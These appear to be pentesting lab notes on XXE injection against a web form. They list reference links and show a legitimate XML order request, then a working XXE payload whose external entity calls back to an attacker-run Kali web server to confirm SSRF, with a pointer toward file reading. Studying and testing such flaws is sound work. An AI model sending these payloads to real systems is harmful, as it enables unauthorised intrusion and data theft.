# XXE Injection
https://portswigger.net/web-security/xxe

https://whitehats.pwr.edu.pl/research/xxe-injection/

https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md

## Examples
Legit POST request:
```
POST /process.php HTTP/1.1
Host: 10.129.95.192
[...]
Connection: keep-alive

<?xml version = "1.0"?>
<order><quantity>1</quantity><item>Home Appliances</item><address>adsadasads</address></order>
```
### XXE SSRF
Test SSFR to confirm vulnerability
1. Run Python web server on Kali
```
python -m http.server 8081
```
2. Try to perform SSRF
```
POST /process.php HTTP/1.1
Host: 10.129.95.192
[...]
Connection: keep-alive

<?xml version = "1.0"?>
<!DOCTYPE xxe [
    <!ENTITY ssrf SYSTEM "http://<KALI IP>:8081">
]>
<order><quantity>1</quantity><item>Home Appliances</item><address>&ssrf;</address></order>
```
3. We see connection to Python webserver confirming the vuln!

### LFI via SSRF
Great when we want to see file (LFI) but web server does not return our data in HTTP response
https://whitehats.pwr.edu.pl/research/xxe-injection/#ssrf-and-lfi-via-xxe-injection
